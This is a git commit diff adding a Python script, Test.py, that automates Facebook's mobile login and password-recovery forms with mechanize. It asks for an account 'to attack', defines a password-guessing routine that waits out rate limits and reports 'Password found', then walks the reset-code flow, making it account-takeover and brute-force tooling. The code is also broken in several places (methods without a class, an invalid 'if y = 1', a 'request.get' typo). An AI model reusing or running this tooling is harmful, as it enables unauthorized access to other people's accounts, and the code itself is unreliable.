bc847f2fcd6d0efc3854adc110097f4353cf98b0
krarktel112 <krarktel@gmail.com>
2024-08-25 11:46:29 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -1,1 +1,80 @@
+import itertools
+import sys
+from time import sleep
+from bs4 import BeautifulSoup
+import requests
+import mechanize
+import os
+CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
+MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
+              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
+              'Chrome/7.0.517.41 Safari/534.7' 
+
+LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'
+
+def __init__(self):
+    self.browser = self.setup_browser()
+
+def setup_browser(self):
+    browser = mechanize.Browser()
+    browser.set_handle_robots(False)
+    cookies = mechanize.CookieJar()
+    browser.set_cookiejar(cookies)
+    browser.addheaders = [('User-agent', MOZILLA_UAS)]
+    browser.set_handle_refresh(False)
+    return browser
+
+def send_login(self, email, password):
+    self.browser.open(self.LOGIN_URL)
+    self.browser.select_form(nr=0)
+    self.browser.form['email'] = email
+    self.browser.form['pass'] = password
+    return self.browser.submit().read()
+
+def try_password(self, email, password):
+    print ('Trying %s' % password)
+    data = self.send_login(email, password)
+
+    if self.is_too_often(data):
+        print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
+        sleep(30)
+        self.try_password(password)
+
+    if self.is_logged_in(data):
+        print ('Password found: %s' % password )
+        sys.exit()
+os.system('clear')
+soup = BeautifulSoup()
+email = input('Email address or username to attack:')
+"""password = input('Password:')"""
+browser = mechanize.Browser()
+browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
+browser.select_form(nr=0)
+browser.form['email'] = email
+browser.submit()
+"""selection confirmation"""
+browser.select_form(nr=0)
+browser.submit()
+browser.select_form(nr=0)
+browser.submit()
+browser.select_form(nr=0)
+browser.submit()
+y = input('Continue? 1,2, else:')
+if y = 1:
+  exit()
+else:
+  y =0
+
+"""reset code input"""
+browser.select_form(nr=0)
+url1 = browser.geturl()
+print(browser.geturl())
+reset = input('Code: ')
+browser.form['n'] = reset
+browser.submit()
+reset = 999999
+check = str(browser.geturl())
+test = str(browser.geturl())
+response = request.get(browser.geturl())
+soup = BeautifulSoup(response.text, 'html.parser')
